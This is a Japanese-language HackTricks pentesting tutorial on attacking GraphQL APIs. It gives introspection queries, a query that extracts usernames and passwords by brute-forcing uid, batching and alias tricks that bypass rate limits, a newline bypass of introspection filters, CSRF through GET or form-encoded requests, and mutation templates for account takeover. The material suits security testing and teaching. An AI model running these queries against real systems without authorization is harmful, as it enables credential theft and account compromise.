# GraphQL

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェック！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見る
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)をフォローする。
* **ハッキングテクニックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出する。

</details>

## 導入

GraphQLは、バックエンドからデータをクエリするための簡略化されたアプローチを提供する**効率的な代替手段**として**強調**されています。 RESTとは異なり、データを収集するためにさまざまなエンドポイントに対して多数のリクエストが必要なRESTに対し、GraphQLは**単一のリクエスト**を介して必要なすべての情報を取得できます。この効率化により、データ取得プロセスの複雑さが軽減され、開発者に**大きな利益**がもたらされます。

## GraphQLとセキュリティ

GraphQLを含む新しい技術の登場に伴い、新しいセキュリティ脆弱性も発生しています。**GraphQLにはデフォルトで認証メカニズムが含まれていない**ことに注意することが重要です。適切な認証がない場合、GraphQLエンドポイントは認証されていないユーザーに機密情報を公開する可能性があり、重大なセキュリティリスクを引き起こす可能性があります。

### ディレクトリブルートフォース攻撃とGraphQL

公開されたGraphQLインスタンスを特定するために、ディレクトリブルートフォース攻撃に特定のパスを含めることが推奨されています。これらのパスは次のとおりです:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

公開されたGraphQLインスタンスを特定することで、サポートされているクエリの調査が可能になります。これは、エンドポイントを介してアクセス可能なデータを理解するために重要です。GraphQLの内省システムは、スキーマがサポートするクエリを詳細に示すことでこれを容易にします。詳細については、GraphQLの内省に関するドキュメントを参照してください: [**GraphQL: A query language for APIs.**](https://graphql.org/learn/introspection/)

### フィンガープリント

ツール [**graphw00f**](https://github.com/dolevf/graphw00f) は、サーバーで使用されているGraphQLエンジンを検出し、セキュリティ監査人に役立つ情報を表示することができます。

#### ユニバーサルクエリ <a href="#universal-queries" id="universal-queries"></a>

URLがGraphQLサービスであるかどうかを確認するために、**ユニバーサルクエリ** `query{__typename}` を送信できます。応答に `{"data": {"__typename": "Query"}}` が含まれている場合、URLがGraphQLエンドポイントをホストしていることが確認されます。この方法は、GraphQLの `__typename` フィールドに依存しており、クエリされたオブジェクトのタイプを明らかにします。
```javascript
query{__typename}
```
### 基本的な列挙

GraphQLは通常**GET**、**POST** (x-www-form-urlencoded)、および**POST**(json)をサポートしています。セキュリティ上の理由から、CSRF攻撃を防ぐためにjsonのみを許可することが推奨されています。

#### イントロスペクション

スキーマ情報を発見するためにイントロスペクションを使用するには、`__schema`フィールドをクエリしてください。このフィールドはすべてのクエリのルートタイプで利用可能です。
```bash
query={__schema{types{name,fields{name}}}}
```
以下のクエリを使用すると、使用されているすべてのタイプの名前が見つかります：

![](<../../.gitbook/assets/image (1036).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

このクエリを使用すると、すべてのタイプ、そのフィールド、および引数（および引数のタイプ）を抽出できます。これはデータベースへのクエリ方法を知るために非常に役立ちます。

![](<../../.gitbook/assets/image (950).png>)

**エラー**

**エラー**が表示されるかどうかを知ることは興味深いです。なぜなら、それらは有用な**情報**を提供するからです。
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
**スキーマの列挙を通じたデータベーススキーマの列挙**

{% hint style="info" %}
もしインスペクションが有効になっているが上記のクエリが実行されない場合は、クエリ構造から`onOperation`、`onFragment`、および`onField`ディレクティブを削除してみてください。
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
インラインインスペクションクエリ：
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
最後のコード行は、GraphQLからすべてのメタ情報（オブジェクト名、パラメータ、タイプなど）をダンプするGraphQLクエリです。

![](<../../.gitbook/assets/image (363).png>)

インスペクションが有効になっている場合、[**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager)を使用して、すべてのオプションをGUIで表示できます。

### クエリ

データベース内に保存されている情報の種類がわかったので、いくつかの値を**抽出**してみましょう。

インスペクションで、**直接クエリできるオブジェクト**を見つけることができます（存在するだけではオブジェクトをクエリできません）。次の画像では、"_queryType_"が"_Query_"と呼ばれ、"_Query_"オブジェクトのフィールドの1つが"_flags_"であり、これもオブジェクトの1つであることがわかります。したがって、フラグオブジェクトをクエリできます。

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-17-48.png>)

クエリ"_flags_"のタイプが"_Flags_"であることに注意してください。このオブジェクトは以下のように定義されています：

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-22-57 (1).png>)

"_Flags_"オブジェクトは**名前**と**値**で構成されていることがわかります。そのため、次のクエリですべてのフラグの名前と値を取得できます：
```javascript
query={flags{name, value}}
```
注意してください。**クエリするオブジェクト**が次の例のように**string**のような**プリミティブタイプ**である場合

![](<../../.gitbook/assets/image (958).png>)

次のようにクエリすることができます：
```javascript
query={hiddenFlags}
```
別の例では、"_Query_" タイプのオブジェクト内に 2 つのオブジェクトがある場合があります: "_user_" と "_users_"。\
これらのオブジェクトには検索に必要な引数が必要ない場合、単に欲しいデータをリクエストするだけで、**それらからすべての情報を取得**できます。この例では、保存されたユーザー名とパスワードを抽出できます:

![](<../../.gitbook/assets/image (880).png>)

ただし、この例では、そうしようとすると次の**エラー**が発生します:

![](<../../.gitbook/assets/image (1042).png>)

どうやら、"_**uid**_" 引数の型が _**Int**_ を使用して検索されるようです。\
とにかく、すでに、[基本列挙](graphql.md#basic-enumeration)セクションで、必要なすべての情報を表示しているクエリが提案されていることを知っていました: `query={__schema{types{name,fields{name, args{name,description,type{name, kind,ofType{name, kind}}}}}}}`

そのクエリを実行したときに提供された画像を読むと、"_**user**_" には _Int_ 型の "_**uid**_" 引数があることがわかります。

したがって、軽い _**uid**_ ブルートフォースを実行すると、_**uid**=**1**_ でユーザー名とパスワードが取得されることがわかりました:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (90).png>)

**注意**: "_**user**_" と "_**password**_" の **パラメータ**をリクエストできることを**発見**しました。存在しないものを探そうとすると (`query={user(uid:1){noExists}}`) 次のエラーが発生します:

![](<../../.gitbook/assets/image (707).png>)

そして、**列挙フェーズ**中に、"_**dbuser**_" オブジェクトには "_**user**_" と "_**password**_" のフィールドがあることがわかりました。

**クエリ文字列ダンプトリック (感謝 @BinaryShadow\_)**

`query={theusers(description: ""){username,password}}` のように文字列型で検索できる場合、**空の文字列**を検索すると、すべてのデータが**ダンプ**されます。(_この例はチュートリアルの例とは関係ありません。この例では、文字列フィールド "**description**" を使用して "**theusers**" で検索できると仮定します_).

### 検索

このセットアップでは、**データベース**には**人物**と**映画**が含まれています。**人物**は**メール**と**名前**で識別され、**映画**は**名前**と**評価**で識別されます。**人物**はお互いに友達になることができ、また映画を持つことができ、データベース内の関係を示します。

名前で人物を検索し、そのメールアドレスを取得できます:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
あなたは**名前**で人を**検索**し、彼らが**購読している****映画**を取得できます：
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
注意してください。`subscribedMovies`の`name`を取得するように指示されています。

また、**同時に複数のオブジェクトを検索**することもできます。この場合、2つの映画を検索します：
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
または、**エイリアスを使用して複数の異なるオブジェクトの関係**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutations

**ミューテーションはサーバーサイドで変更を加えるために使用されます。**

**インスペクション**では、**宣言された** **ミューテーション**を見つけることができます。次の画像では、"_MutationType_" は "_Mutation_" と呼ばれ、"_Mutation_" オブジェクトにはミューテーションの名前が含まれています（この場合は "_addPerson_" のような）:

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-26-27 (1).png>)

このセットアップでは、**データベース**には**人物**と**映画**が含まれています。**人物**は**メール**と**名前**で識別され、**映画**は**名前**と**評価**で識別されます。**人物**はお互いに友達であり、また映画を持つことができ、データベース内の関係を示します。

データベース内に**新しい**映画を作成するためのミューテーションは、次のようになります（この例ではミューテーションは `addMovie` と呼ばれています）:
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**クエリ内でデータの値とタイプが両方示されていることに注意してください。**

さらに、データベースは`addPerson`という**ミューテーション**操作をサポートしており、これにより新しく作成された**persons**が既存の**friends**や**movies**との関連付けが可能です。重要なのは、友達や映画は新しく作成された人物にリンクする前にデータベース内に事前に存在している必要があるということです。
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### ディレクティブの過負荷

[**このレポートで説明されている脆弱性の1つ**](https://www.landh.tech/blog/20240304-google-hack-50000/)によると、ディレクティブの過負荷は、サーバーが操作を無駄にするまで何百万回もディレクティブを呼び出すことを意味し、それによってDoS攻撃が可能になります。

### 1つのAPIリクエストでのバッチングブルートフォース

この情報は[https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/)から取得されました。\
**異なる資格情報を持つ多くのクエリを同時に送信**して認証を行うGraphQL API。これはクラシックなブルートフォース攻撃ですが、GraphQLのバッチ処理機能のおかげで1つのHTTPリクエストで複数のログイン/パスワードペアを送信することが可能になりました。このアプローチにより、外部のレート監視アプリケーションをだまして、パスワードを推測しようとするブルートフォースボットが存在しないかのように見せることができます。

以下は、**1回のアプリケーション認証リクエストで3つの異なるメール/パスワードペア**を持つ最も単純なデモンストレーションです。明らかに、同じ方法で1回のリクエストで数千を送信することも可能です：

![](<../../.gitbook/assets/image (1081).png>)

応答スクリーンショットからわかるように、最初と3番目のリクエストは _null_ を返し、対応する情報を _error_ セクションに反映しました。**2番目のミューテーションには正しい認証**データがあり、応答には正しい認証セッショントークンが含まれています。

![](<../../.gitbook/assets/image (119) (1).png>)

## イントロスペクションなしのGraphQL

**graphqlエンドポイントがイントロスペクションを無効にする**ケースが増えています。ただし、予期しないリクエストが受信された際にgraphqlがスローするエラーは、[**clairvoyance**](https://github.com/nikitastupin/clairvoyance)のようなツールにとって、スキーマの大部分を再作成するのに十分です。

さらに、Burp Suite拡張機能[**GraphQuail**](https://github.com/forcesunseen/graphquail)は、Burpを介して通過するGraphQL APIリクエストを**監視**し、新しいクエリごとに内部GraphQL **スキーマ**を**構築**します。また、イントロスペクションクエリを受信すると偽の応答を返します。その結果、GraphQuailはAPI内で使用可能なすべてのクエリ、引数、およびフィールドを表示します。詳細については[**こちらをチェック**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema)。

[**こちらでGraphQLエンティティを発見するための素敵なワードリスト**](https://github.com/Escape-Technologies/graphql-wordlist?)が見つかります。

### GraphQLイントロスペクション防御のバイパス <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

API内のイントロスペクションクエリに対する制限をバイパスするには、`__schema`キーワードの後に**特殊文字を挿入**すると効果的です。この方法は、`__schema`キーワードに焦点を当ててイントロスペクションをブロックするための正規表現パターンに一般的な開発者の見落としを悪用します。GraphQLが無視するが正規表現で考慮されていない文字（スペース、改行、カンマなど）を追加することで、制限を回避できます。たとえば、`__schema`の後に改行があるイントロスペクションクエリは、そのような防御をバイパスする可能性があります。
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
もし失敗した場合は、**GETリクエスト**や**`x-www-form-urlencoded`を使用したPOST**などの代替リクエスト方法を検討してください。制限がPOSTリクエストにのみ適用される可能性があるためです。

### **公開されたGraphQL構造の発見**

Introspectionが無効になっている場合、JavaScriptライブラリ内の事前読み込みクエリをウェブサイトのソースコードで調査することは有用な戦略です。これらのクエリは開発者ツールの`Sources`タブを使用して見つけることができ、APIのスキーマに対する洞察を提供し、**公開された機密クエリ**を明らかにします。開発者ツール内で検索するコマンドは次のとおりです：
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## GraphQLにおけるCSRF

CSRFとは何かわからない場合は、以下のページを読んでください:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

GraphQLエンドポイントの中には、**CSRFトークンなしで構成されているもの**がいくつか見つかる可能性があります。

GraphQLリクエストは通常、Content-Typeが**`application/json`**で送信されるPOSTリクエストを使用します。
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
しかし、ほとんどのGraphQLエンドポイントは**`form-urlencoded` POSTリクエスト**もサポートしています:
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
したがって、前述のようなCSRFリクエストは**事前リクエストなし**で送信されるため、CSRFを悪用してGraphQLで**変更**を行うことが可能です。

ただし、Chromeの`samesite`フラグの新しいデフォルトクッキー値は`Lax`です。これは、クッキーがサードパーティのWebからのGETリクエストでのみ送信されることを意味します。

また、**クエリリクエスト**を**GETリクエスト**として送信することも通常可能であり、GETリクエストではCSRFトークンが検証されない可能性があります。

また、[**XS-Search**](../../pentesting-web/xs-search/) **攻撃**を悪用することで、ユーザーの資格情報を悪用してGraphQLエンドポイントからコンテンツを外部に流出させることが可能かもしれません。

詳細については、[**こちらの元の投稿**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html)をご覧ください。

## GraphQLでの認証

エンドポイントで定義された多くのGraphQL関数は、リクエスト元の認証のみをチェックし、認可をチェックしない場合があります。

クエリ入力変数の変更は、機密なアカウント詳細が[**漏洩**](https://hackerone.com/reports/792927)する可能性があります。

変異は、他のアカウントデータを変更しようとすることで、アカウント乗っ取りにつながる可能性さえあります。
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### GraphQLでの認証のバイパス

[クエリの連鎖](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln)を行うことで、弱い認証システムをバイパスできます。

以下の例では、操作が "forgotPassword" であり、それに関連するforgotPasswordクエリのみを実行すべきであることがわかります。これは、クエリを追加することでバイパスできます。この場合、"register"を追加し、新しいユーザーとしてシステムに登録するためのユーザー変数を追加します。

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## エイリアスを使用したGraphQLのレート制限のバイパス

GraphQLでは、エイリアスはAPIリクエストを行う際に**プロパティを明示的に命名**する強力な機能です。この機能は、1つのリクエスト内で**同じタイプのオブジェクトの複数のインスタンス**を取得する際に特に便利です。エイリアスは、GraphQLオブジェクトが同じ名前の複数のプロパティを持つことを防ぐ制限を克服するために使用できます。

GraphQLのエイリアスの詳細な理解については、次のリソースを参照してください: [エイリアス](https://portswigger.net/web-security/graphql/what-is-graphql#aliases)。

エイリアスの主な目的は、多数のAPI呼び出しを必要としないようにすることですが、エイリアスを使用してGraphQLエンドポイントでブルートフォース攻撃を実行するために利用される副次的な用途が特定されています。これは、一部のエンドポイントが**HTTPリクエストの数**を制限することでブルートフォース攻撃を防ぐように設計されたレートリミッターで保護されている可能性があるためです。ただし、これらのレートリミッターは、各リクエスト内の操作の数を考慮していないかもしれません。エイリアスを使用すると、1つのHTTPリクエスト内に複数のクエリを含めることができるため、このようなレート制限措置を回避できます。

以下に示す例を考えてみてください。これは、エイリアス付きクエリを使用してストアの割引コードの有効性を検証する方法を示しており、この方法は、複数の割引コードの検証を同時に行う可能性があるため、レート制限を回避できるかもしれません。
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## ツール

### 脆弱性スキャナー

* [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): GraphQLエンドポイントの一般的な誤構成をテストします
* [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): 使用されているGraphQLをフィンガープリントします
* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): スキーマを取得し、機密データを検索し、認証をテストし、スキーマを総当たり攻撃し、特定のタイプへのパスを見つけるために使用できるツールです。
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): スタンドアロンまたは[Burp拡張機能](https://github.com/doyensec/inql)として使用できます。
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): CLIクライアントとしても使用でき、攻撃を自動化するためにも使用できます
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): GraphQLスキーマ内の特定のタイプに到達する異なる方法をリストするツールです。
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): 高度なGraphQLテスト用のBurp拡張機能。 _**Scanner**_ はInQL v5.0のコアであり、GraphQLエンドポイントまたはローカルの内省スキーマファイルを分析できます。すべての可能なクエリとミューテーションを自動生成し、分析のために構造化されたビューに整理します。 _**Attacker**_ コンポーネントを使用すると、バッチGraphQL攻撃を実行できます。これは実装が不十分なレート制限を回避するのに役立ちます。

### クライアント

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUIクライアント
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUIクライアント

### 自動テスト

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* AutoGraphQLの説明ビデオ: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## 参考文献

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）でAWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つけてください
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、自分のハッキングトリックを共有してください。

</details>
